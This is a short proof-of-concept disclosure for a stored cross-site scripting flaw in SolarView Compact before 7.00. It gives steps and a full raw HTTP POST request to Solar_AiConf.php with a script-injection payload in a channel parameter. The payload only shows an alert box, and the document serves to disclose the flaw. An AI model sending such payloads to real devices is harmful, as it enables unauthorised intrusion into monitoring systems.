# SolarView-Compact-Stored-XSS

## Description 

Stored XSS in SolarView Compact prior to 7.00 which lead attackers to inject arbitrary script code

## POC

1. navigate to http://{HOST}/Solar_AiConf.php
2. click on update and capture the request
3. edit any of `ch*_*` values to `"><script>alert('XSS_By_Strik3r')`
  
```
POST /Solar_AiConf.php HTTP/1.1
Host: {HOST}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: http://{HOST}
Connection: close
Referer: http://{HOST}/Solar_AiConf.php
Upgrade-Insecure-Requests: 1

ch0_min=0&ch0_max=1.43&ch1_min=-50&ch1_max=50&ch2_min=1&ch2_max=5&ch3_min=1"><script>alert('XSS_By_Strik3r')</script&ch3_max=5&button=%8DX%90V
```

4. send the request and notice the XSS alert
